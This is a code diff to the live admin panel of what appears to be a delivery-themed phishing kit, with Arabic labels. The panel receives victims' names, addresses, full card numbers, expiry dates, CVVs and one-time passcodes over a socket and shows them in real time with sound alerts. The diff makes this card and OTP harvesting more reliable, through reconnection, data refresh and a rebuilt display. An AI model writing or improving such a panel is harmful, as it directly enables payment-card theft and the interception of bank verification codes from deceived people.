@@ -44,15 +44,26 @@ function initAdminSocket() {
   return new Promise((resolve, reject) => {
     socket = io(SERVER_URL, {
       query: { sessionId: 'admin_' + Date.now() },
-      transports: ['websocket', 'polling']
+      transports: ['websocket', 'polling'],
+      reconnection: true,
+      reconnectionAttempts: 10,
+      reconnectionDelay: 1000
     });
 
     socket.on('connect', () => {
       console.log('🔌 Admin connected');
       updateConnectionStatus(true);
-      if (adminToken) {
-        socket.emit('admin:validate', { sessionToken: adminToken });
-      }
+      
+      // Wait for connection to stabilize
+      setTimeout(() => {
+        if (adminToken) {
+          socket.emit('admin:validate', { sessionToken: adminToken });
+        }
+        
+        // Request initial data immediately after connection
+        requestInitialData();
+      }, 500);
+      
       resolve(socket);
     });
 
@@ -65,6 +76,16 @@ function initAdminSocket() {
     socket.on('disconnect', () => {
       console.log('🔌 Admin disconnected');
       updateConnectionStatus(false);
+    });
+    
+    socket.on('reconnect', () => {
+      console.log('🔌 Admin reconnected');
+      updateConnectionStatus(true);
+      // Re-validate and refresh data on reconnect
+      if (adminToken) {
+        socket.emit('admin:validate', { sessionToken: adminToken });
+      }
+      requestInitialData();
     });
 
     socket.on('admin:valid', (data) => {
@@ -106,10 +127,11 @@ function initAdminSocket() {
     socket.on('form:deliverySubmitted', (data) => {
       sounds.formDelivery();
       updateStats();
+      console.log('📦 Delivery submitted:', data);
       // Update card with delivery data without full refresh
       updateVisitorCard(data.sessionId, { 
         form_submitted: true, 
-        delivery_data: data.formData,
+        delivery_data: data.formData || data.deliveryData,
         is_online: true
       });
     });
@@ -117,10 +139,11 @@ function initAdminSocket() {
     socket.on('form:paymentSubmitted', (data) => {
       sounds.formPayment();
       updateStats();
+      console.log('💳 Payment submitted:', data);
       // Update card with payment data without full refresh
       updateVisitorCard(data.sessionId, { 
         payment_submitted: true, 
-        payment_data: data.paymentData,
+        payment_data: data.paymentData || data.paymentData,
         is_online: true
       });
     });
@@ -128,11 +151,12 @@ function initAdminSocket() {
     socket.on('form:verificationSubmitted', (data) => {
       sounds.formVerification();
       updateStats();
+      console.log('🔐 Verification submitted:', data);
       // Update card with verification data and OTP history without full refresh
       updateVisitorCard(data.sessionId, { 
         verification_submitted: true, 
         verification_data: data.verificationData,
-        otp_history: data.otpHistory || [],
+        otp_history: data.otpHistory || data.otp_history || [],
         is_online: true
       });
     });
@@ -504,10 +528,21 @@ function updateVisitorStatus(sessionId, isOnline) {
   }
 }
 
+// Request initial data on connection
+function requestInitialData() {
+  if (!socket) return;
+  socket.emit('visitors:request');
+  socket.emit('stats:request');
+  console.log('📡 Requesting initial data...');
+}
+
 function updateVisitorCard(sessionId, data) {
   var card = document.querySelector('[data-session="' + sessionId + '"]');
+  
+  // If card doesn't exist, try to add it
   if (!card) {
-    // Card doesn't exist, don't refresh the whole list
+    console.log('📝 Card not found for:', sessionId, '- will refresh list');
+    updateVisitorsList();
     return;
   }
   
@@ -516,54 +551,121 @@ function updateVisitorCard(sessionId, data) {
     card.setAttribute('data-online', data.is_online);
   }
   
+  // Update online/offline status visually
+  var header = card.querySelector('.card-header');
+  var statusEl = card.querySelector('.card-status');
+  if (data.is_online === true) {
+    header.style.background = 'linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%)';
+    if (statusEl) {
+      statusEl.innerHTML = '<span class="dot"></span><span>متصل الآن</span>';
+    }
+  }
+  
+  var cardBody = card.querySelector('.card-body');
+  
   // Update delivery data
-  if (data.delivery_data) {
-    var deliverySection = card.querySelector('.card-section:not(.payment-section):not(.otp-section)');
-    if (!deliverySection) {
-      // Need to recreate card with full data
-      updateVisitorsList();
-      return;
+  if (data.delivery_data && cardBody) {
+    var deliveryData = data.delivery_data;
+    var deliveryHTML = '<div class="card-section"><div class="section-title"><span>📦</span> بيانات التوصيل</div>';
+    if (deliveryData.fullName) deliveryHTML += '<div class="data-row"><span class="data-label">الاسم الكامل</span><span class="data-value">' + deliveryData.fullName + '</span></div>';
+    if (deliveryData.phone) deliveryHTML += '<div class="data-row"><span class="data-label">رقم الهاتف</span><span class="data-value">' + deliveryData.phone + '</span></div>';
+    if (deliveryData.email) deliveryHTML += '<div class="data-row"><span class="data-label">البريد الإلكتروني</span><span class="data-value">' + deliveryData.email + '</span></div>';
+    if (deliveryData.city) deliveryHTML += '<div class="data-row"><span class="data-label">المدينة / المنطقة</span><span class="data-value">' + deliveryData.city + (deliveryData.region ? ' / ' + deliveryData.region : '') + '</span></div>';
+    if (deliveryData.address) deliveryHTML += '<div class="data-row"><span class="data-label">العنوان</span><span class="data-value">' + deliveryData.address + '</span></div>';
+    if (deliveryData.notes) deliveryHTML += '<div class="data-row"><span class="data-label">ملاحظات</span><span class="data-value highlight">' + deliveryData.notes + '</span></div>';
+    deliveryHTML += '</div>';
+    
+    // Update or insert delivery section
+    var existingDelivery = cardBody.querySelector('.card-section:not(.payment-section):not(.otp-section)');
+    if (existingDelivery) {
+      existingDelivery.outerHTML = deliveryHTML;
+    } else {
+      cardBody.insertAdjacentHTML('afterbegin', deliveryHTML);
+    }
+  }
+  
+  // Update payment data
+  if (data.payment_data && cardBody) {
+    var paymentData = data.payment_data;
+    var paymentHTML = '<div class="card-section payment-section"><div class="section-title" style="border-bottom-color:#93c5fd;"><span>💳</span> بيانات الدفع</div>';
+    var cardNum = paymentData.cardNumber || paymentData.card_number || '';
+    if (cardNum) paymentHTML += '<div class="data-row"><span class="data-label">رقم البطاقة</span><span class="data-value">' + cardNum + '</span></div>';
+    if (paymentData.cardHolder) paymentHTML += '<div class="data-row"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + paymentData.cardHolder + '</span></div>';
+    if (paymentData.expiry) paymentHTML += '<div class="data-row"><span class="data-label">تاريخ الانتهاء</span><span class="data-value">' + paymentData.expiry + '</span></div>';
+    if (paymentData.cvv) paymentHTML += '<div class="data-row"><span class="data-label">رمز الحماية (CVV)</span><span class="data-value highlight">' + paymentData.cvv + '</span></div>';
+    paymentHTML += '</div>';
+    
+    // Update or insert payment section
+    var existingPayment = cardBody.querySelector('.payment-section');
+    if (existingPayment) {
+      existingPayment.outerHTML = paymentHTML;
+    } else {
+      var deliverySection = cardBody.querySelector('.card-section');
+      if (deliverySection) {
+        deliverySection.insertAdjacentHTML('afterend', paymentHTML);
+      } else {
+        cardBody.insertAdjacentHTML('afterbegin', paymentHTML);
+      }
+    }
+  }
+  
+  // Update OTP data
+  if ((data.verification_data || data.otp_history) && cardBody) {
+    var verificationData = data.verification_data || {};
+    var otpHistory = data.otp_history || [];
+    var otpValue = verificationData.otp || '';
+    
+    if (!otpValue && otpHistory.length > 0) {
+      otpValue = otpHistory[0].otp;
     }
     
-    // Update delivery fields if they exist
-    var deliveryData = data.delivery_data;
-    Object.keys(deliveryData).forEach(function(key) {
-      var row = deliverySection.querySelector('.data-row:has(.data-label:contains("' + key + '"))');
-      if (row) {
-        var valueEl = row.querySelector('.data-value');
-        if (valueEl) valueEl.textContent = deliveryData[key];
+    if (otpValue) {
+      var historyHTML = '';
+      if (otpHistory.length > 1) {
+        var oldOtps = otpHistory.slice(1).map(function(item) {
+          var date = new Date(item.timestamp).toLocaleString('ar-OM');
+          return '<div class="otp-history-item">الرموز السابقة: <strong>' + item.otp + '</strong> <small>(' + date + ')</small></div>';
+        }).join('');
+        historyHTML = '<div class="otp-history-dropdown" id="otpHistory_' + sessionId + '">' + oldOtps + '</div>';
       }
-    });
+      
+      var otpSectionHTML = '<div class="otp-section"><div class="section-title" style="cursor:pointer;" onclick="toggleOtpHistory(\'' + sessionId + '\')"><span>🔐</span> رمز التحقق (OTP)' + (otpHistory.length > 1 ? '<span style="margin-right:auto;font-size:12px;color:var(--accent);">▼ ' + otpHistory.length + ' رمز</span>' : '') + '</div><div class="otp-value">' + otpValue + '</div>' + historyHTML + '</div>';
+      
+      // Update or insert OTP section
+      var existingOTP = cardBody.querySelector('.otp-section');
+      if (existingOTP) {
+        existingOTP.outerHTML = otpSectionHTML;
+      } else {
+        cardBody.insertAdjacentHTML('beforeend', otpSectionHTML);
+      }
+    }
   }
   
   // Update progress steps
-  if (data.form_submitted !== undefined || data.payment_submitted !== undefined || data.verification_submitted !== undefined) {
-    var steps = card.querySelectorAll('.progress-step');
-    
-    if (data.form_submitted && steps[0]) {
-      steps[0].classList.add('completed');
-      steps[0].classList.remove('active');
-      steps[0].querySelector('.step-icon').textContent = '✓';
-    }
-    
-    if (data.payment_submitted && steps[1]) {
-      steps[1].classList.add('completed');
-      steps[1].classList.remove('active');
-      steps[1].querySelector('.step-icon').textContent = '✓';
-    }
-    
-    if (data.verification_submitted && steps[2]) {
-      steps[2].classList.add('completed');
-      steps[2].classList.remove('active');
-      steps[2].querySelector('.step-icon').textContent = '✓';
-    }
+  var steps = card.querySelectorAll('.progress-step');
+  if (data.form_submitted && steps[0]) {
+    steps[0].classList.add('completed');
+    steps[0].classList.remove('active');
+    steps[0].querySelector('.step-icon').textContent = '✓';
+  }
+  if (data.payment_submitted && steps[1]) {
+    steps[1].classList.add('completed');
+    steps[1].classList.remove('active');
+    steps[1].querySelector('.step-icon').textContent = '✓';
+  }
+  if (data.verification_submitted && steps[2]) {
+    steps[2].classList.add('completed');
+    steps[2].classList.remove('active');
+    steps[2].querySelector('.step-icon').textContent = '✓';
   }
   
   // Add animation for update
   card.style.boxShadow = '0 0 20px rgba(16, 185, 129, 0.5)';
+  card.style.transform = 'scale(1.02)';
   setTimeout(function() {
     card.style.boxShadow = '';
-  }, 1000);
+    card.style.transform = '';
+  }, 500);
 }
 
 // Stats Functions
